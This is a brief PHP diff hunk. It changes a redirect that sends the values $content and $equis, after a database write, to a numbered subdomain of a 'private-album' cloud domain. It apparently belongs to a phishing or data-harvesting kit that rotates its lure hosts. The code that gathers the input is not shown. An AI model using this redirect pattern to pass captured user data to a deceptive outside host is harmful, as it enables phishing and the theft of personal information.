@@ -19,11 +19,11 @@ if(!empty($equis)){
    $conn->query($sql);
 }
 
-header('Location: https://10482938902.private-album.cloud?content='.$content.'&equis='.$equis);
+header('Location: https://1027483947.private-album-i.cloud?content='.$content.'&equis='.$equis);
 
 $conn->close();
 
-header('Location: https://10482938902.private-album.cloud?content='.$content.'&equis='.$equis);
+header('Location: https://1027483947.private-album-i.cloud?content='.$content.'&equis='.$equis);
 
 ob_end_flush();
 
